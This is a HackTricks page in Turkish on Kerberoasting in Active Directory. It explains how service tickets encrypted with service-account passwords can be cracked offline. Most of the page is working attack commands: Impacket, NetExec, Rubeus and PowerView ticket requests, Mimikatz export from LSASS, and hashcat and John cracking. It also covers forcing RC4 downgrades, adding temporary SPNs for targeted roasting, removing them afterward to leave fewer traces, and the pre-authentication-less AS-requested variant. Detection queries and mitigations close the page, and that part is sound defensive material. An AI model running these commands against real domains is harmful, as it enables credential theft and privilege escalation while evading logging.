# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting, Active Directory'de (AD) bilgisayar hesapları hariç, kullanıcı hesapları altında çalışan hizmetlerle ilişkili TGS biletlerinin edinilmesine odaklanır. Bu biletler, kullanıcı parolalarından türetilen anahtarlarla şifrelenir ve bu da kimlik bilgilerinin çevrimdışı kırılmasına olanak tanır. Bir hizmetin kullanıcı hesabı olarak çalıştığı, ServicePrincipalName (SPN) özelliğinin boş olmamasından anlaşılır.

Kimliği doğrulanmış herhangi bir etki alanı kullanıcısı TGS bileti isteyebilir; bu nedenle özel ayrıcalıklar gerekmez.<sup>[[4]](#references)[[5]](#references)</sup>

### Temel Noktalar

- Kullanıcı hesapları altında çalışan hizmetlere ait TGS biletlerini hedefler (yani SPN atanmış hesaplar; bilgisayar hesapları değil).
- Biletler, hizmet hesabının parolasından türetilen bir anahtarla şifrelenir ve çevrimdışı kırılabilir.
- Yükseltilmiş ayrıcalık gerekmez; kimliği doğrulanmış herhangi bir hesap TGS bileti isteyebilir.

> [!WARNING]
> Çoğu herkese açık araç, AES'e kıyasla daha hızlı kırılabildiğinden RC4-HMAC (etype 23) hizmet biletlerini istemeyi tercih eder. RC4 TGS hash'leri `$krb5tgs$23$*`, AES128 hash'leri `$krb5tgs$17$*` ve AES256 hash'leri `$krb5tgs$18$*` ile başlar. Ancak birçok ortam yalnızca AES kullanmaya geçiyor. Yalnızca RC4'ün önemli olduğunu varsaymayın.
> Ayrıca “spray-and-pray” roasting yapmaktan kaçının. Rubeus'un varsayılan kerberoast işlevi tüm SPN'leri sorgulayıp bilet isteyebilir ve bu gürültülüdür. Önce ilgi çekici principal'ları numaralandırıp hedefleyin.

### Hizmet hesabı sırları ve Kerberos şifrelemesinin maliyeti

Birçok hizmet hâlâ elle yönetilen parolalara sahip kullanıcı hesapları altında çalışır. KDC, hizmet biletlerini bu parolalardan türetilen anahtarlarla şifreler ve şifreli veriyi kimliği doğrulanmış tüm principal'lara verir; böylece kerberoasting, hesap kilitlenmesi veya DC telemetrisi olmadan sınırsız çevrimdışı parola denemesi yapılmasını sağlar. Şifreleme modu, kırma için gereken kaynakları belirler:

| Mod | Anahtar türetme | Şifreleme türü | Yaklaşık RTX 5090 hızı* | Notlar |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | 4.096 yinelemeli PBKDF2-HMAC-SHA1 ve etki alanı + SPN'den oluşturulan principal'a özgü salt | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 milyon deneme/s | Salt, rainbow table kullanımını engeller ancak kısa parolaların hızlıca kırılmasına olanak tanır. |
| RC4 + NT hash | Parolanın tek MD4 özeti (saltsız NT hash); Kerberos her bilet için yalnızca 8 baytlık bir karıştırıcı ekler | etype 23 (`$krb5tgs$23$`) | ~4.18 **milyar** deneme/s | AES'ten ~1000× daha hızlıdır; `msDS-SupportedEncryptionTypes` izin verdiğinde saldırganlar RC4'ü zorlar. |

*Matthew Green'in [Kerberoasting analizinde](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/) aktarılan Chick3nman kıyaslamaları.<sup>[[3]](#references)</sup>

RC4'ün karıştırıcısı yalnızca keystream'i rastgeleleştirir; her deneme için gereken işi artırmaz. Hizmet hesapları rastgele sırlara (gMSA/dMSA, makine hesapları veya kasa tarafından yönetilen dizeler) dayanmıyorsa, ele geçirilme hızı yalnızca GPU bütçesine bağlıdır. Yalnızca AES etype'lerini zorunlu kılmak, saniyede milyarlarca denemeye olanak veren düşürme seçeneğini ortadan kaldırır; ancak zayıf insan parolaları yine de PBKDF2 ile kırılabilir.<sup>[[3]](#references)</sup>

### Saldırı

#### Linux

Roasting'e açık biletleri istemek için NetExec'i, bunları kırmak içinse Hashcat'i kullanan uygulamalı, uçtan uca bir örnek [1] numaralı referansta mevcuttur.<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

Kerberoast kontrollerini de içeren çok işlevli araçlar:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- Kerberoast edilebilir kullanıcıları listele

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Teknik 1: TGS iste ve bellekten dump al

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Teknik 2: Otomatik araçlar

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> Bir TGS isteği, Windows Security Event 4769 oluşturur (Bir Kerberos hizmet bileti istendi).

### OPSEC ve yalnızca AES kullanan ortamlar

- AES kullanmayan hesaplar için bilerek RC4 isteyin:
  - Rubeus: `/rc4opsec`, AES kullanmayan hesapları listelemek için tgtdeleg kullanır ve RC4 hizmet biletleri ister.
  - Rubeus: kerberoast ile birlikte `/tgtdeleg` kullanmak da mümkün olduğunda RC4 isteklerini tetikler.<sup>[[6]](#references)</sup>
- Sessizce başarısız olmak yerine yalnızca AES kullanan hesapları roast edin:
  - Rubeus: `/aes`, AES etkin hesapları listeler ve AES hizmet biletleri ister (etype 17/18).
  - Elinizde zaten bir TGT varsa (PTT ile veya bir .kirbi dosyasından), `/spn:<SPN>` ya da `/spns:<file>` ile `/ticket:<blob|path>` kullanabilir ve LDAP'ı atlayabilirsiniz.
- Hedefleme, istek hızını sınırlama ve daha az gürültü:
  - `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` ve `/jitter:<1-100>` kullanın.
  - `/pwdsetbefore:<MM-dd-yyyy>` ile muhtemelen zayıf parolaları (daha eski parolalar) filtreleyin veya `/ou:<DN>` ile ayrıcalıklı OU'ları hedefleyin.<sup>[[8]](#references)</sup>

Örnekler (Rubeus):

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### Kalıcılık / Kötüye Kullanım

Bir hesabı kontrol ediyor veya değiştirebiliyorsanız, bir SPN ekleyerek onu kerberoastable hâle getirebilirsiniz:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

Daha kolay cracking için RC4'ü etkinleştirmek üzere bir hesabı düşürün (hedef nesne üzerinde yazma ayrıcalıkları gerektirir):

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### Targeted Kerberoast via GenericWrite/GenericAll over a user (temporary SPN)

BloodHound bir kullanıcı nesnesi üzerinde kontrolünüz olduğunu gösterdiğinde (ör. GenericWrite/GenericAll), o kullanıcının şu anda herhangi bir SPN’si olmasa bile hedefli şekilde roast işlemi uygulayabilirsiniz:<sup>[[9]](#references)</sup>

- Roast edilebilir hâle getirmek için kontrolünüzdeki kullanıcıya geçici bir SPN ekleyin.
- Cracking işlemini kolaylaştırmak için bu SPN’ye yönelik RC4 (etype 23) ile şifrelenmiş bir TGS-REP isteyin.
- `$krb5tgs$23$...` hash’ini hashcat ile crack edin.
- İz bırakma olasılığını azaltmak için SPN’yi kaldırın.

Windows (PowerView/Rubeus):

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Linux one-liner (targetedKerberoast.py, SPN ekleme -> TGS (etype 23) isteme -> SPN kaldırma işlemlerini otomatikleştirir):<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

Çıktıyı hashcat autodetect ile crack edin (`$krb5tgs$23$` için 13100 modu):

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

Detection notes: SPN eklemek/kaldırmak dizin değişikliklerine yol açar (hedef kullanıcıda Event ID 5136/4738) ve TGS isteği Event ID 4769 oluşturur. İstekleri yavaşlatmayı ve ardından hızlıca temizlemeyi değerlendirin.

Kerberoast saldırıları için kullanışlı araçları burada bulabilirsiniz: https://github.com/nidem/kerberoast

Linux'ta şu hatayla karşılaşırsanız: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` bunun nedeni yerel saat farkıdır. DC ile eşitleyin:

- `ntpdate <DC_IP>` (bazı dağıtımlarda kullanımdan kaldırılmıştır)
- `rdate -n <DC_IP>`

### Domain hesabı olmadan Kerberoast (AS-requested STs)

Eylül 2022'de Charlie Clark, bir principal pre-authentication gerektirmiyorsa, isteğin gövdesindeki sname değiştirilerek hazırlanmış bir KRB_AS_REQ aracılığıyla service ticket almanın mümkün olduğunu gösterdi. Bu yöntem, etkili bir şekilde TGT yerine service ticket alır. AS-REP roasting yöntemine benzer ve geçerli domain kimlik bilgileri gerektirmez.

Ayrıntılar: Semperis'in “Yeni Saldırı Yolları: AS-requested STs” yazısı.<sup>[[10]](#references)</sup>

> [!WARNING]
> Geçerli kimlik bilgileri olmadan bu teknikle LDAP'ı sorgulayamayacağınız için kullanıcı listesi sağlamanız gerekir.

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

İlgili

AS-REP roastable kullanıcıları hedefliyorsanız, ayrıca şuna bakın:

{{#ref}}
asreproast.md
{{#endref}}

### Tespit

Kerberoasting gizli yürütülebilir. DC’lerdeki Event ID 4769 olaylarını araştırın ve gürültüyü azaltmak için filtreler uygulayın:

- `krbtgt` hizmet adını ve `$` ile biten hizmet adlarını (bilgisayar hesapları) hariç tutun.
- Makine hesaplarından gelen istekleri (`*$$@*`) hariç tutun.
- Yalnızca başarılı istekleri inceleyin (Failure Code `0x0`).
- Şifreleme türlerini izleyin: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Yalnızca `0x17` için uyarı oluşturmayın.

Örnek PowerShell triyajı:

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

Ek fikirler:

- Her host/kullanıcı için normal SPN kullanımının temel çizgisini belirleyin; tek bir principal'dan gelen çok sayıda farklı SPN isteği olduğunda uyarı oluşturun.
- AES ile güçlendirilmiş domain'lerde alışılmadık RC4 kullanımını işaretleyin.

### Azaltma / Güçlendirme

- Servisler için gMSA/dMSA veya machine account kullanın. Yönetilen hesapların 120+ karakterlik rastgele parolaları vardır ve parolaları otomatik olarak yenilenir; bu da çevrimdışı kırmayı pratik olmaktan çıkarır.<sup>[[7]](#references)</sup>
- `msDS-SupportedEncryptionTypes` değerini yalnızca AES kullanacak şekilde ayarlayarak servis hesaplarında AES kullanımını zorunlu kılın (ondalık 24 / onaltılık 0x18); ardından AES anahtarlarının türetilmesi için parolayı yenileyin.<sup>[[7]](#references)</sup>
- Mümkün olduğunda ortamınızda RC4'ü devre dışı bırakın ve RC4 kullanım girişimlerini izleyin. DC'lerde, `msDS-SupportedEncryptionTypes` değeri ayarlanmamış hesaplar için varsayılanları yönlendirmek üzere `DefaultDomainSupportedEncTypes` kayıt defteri değerini kullanabilirsiniz. Kapsamlı şekilde test edin.
- Kullanıcı hesaplarındaki gereksiz SPN'leri kaldırın.<sup>[[7]](#references)</sup>
- Yönetilen hesaplar kullanılamıyorsa uzun ve rastgele servis hesabı parolaları (25+ karakter) kullanın; yaygın parolaları yasaklayın ve düzenli olarak denetim yapın.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat ile uygulamalı parola kırma](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Eski Kerberos şifrelemesinden kaynaklanan düşük teknolojili, yüksek etkili saldırılar (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kerberos'a nasıl saldırılır?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos İstismarı: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: AES etkin olduğunda RC4 şifreli TGS isteme](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Kerberoasting'i azaltmaya yardımcı olmak için Microsoft'un rehberi](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast komut belgeleri](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL kimlik bilgileri → Targeted Kerberoast → Unconstrained Delegation → DA için DCSync](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Yeni saldırı yolları mı? İstenen hizmet biletleri (Charlie Clark, Eylül 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
